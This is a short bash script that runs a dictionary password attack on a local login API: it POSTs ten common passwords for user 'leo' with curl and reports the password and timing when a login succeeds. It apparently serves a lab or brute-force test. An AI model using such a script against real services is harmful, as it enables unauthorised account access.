#!/usr/bin/env bash

API="http://127.0.0.1:8000/login"
USER="leo"

WORDLIST=(pass123 123456 admin admin123 demo secret qwerty password adios)

attempts=0
start=$(date +%s)

for pwd in "${WORDLIST[@]}"; do
  attempts=$((attempts+1))
  resp=$(curl -s -X POST "$API" \
    -H "accept: application/json" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$USER\",\"password\":\"$pwd\"}")
  echo "[$attempts] Probando '$pwd' -> $resp"
  if [[ "$resp" == *"login successful"* ]]; then
    end=$(date +%s)
    echo "ENCONTRADA: password='$pwd' en $attempts intentos, $((end-start))s"
    exit 0
  fi
  sleep 0.2
done

end=$(date +%s)
echo "NO encontrada tras $attempts intentos en $((end-start))s"
exit 1
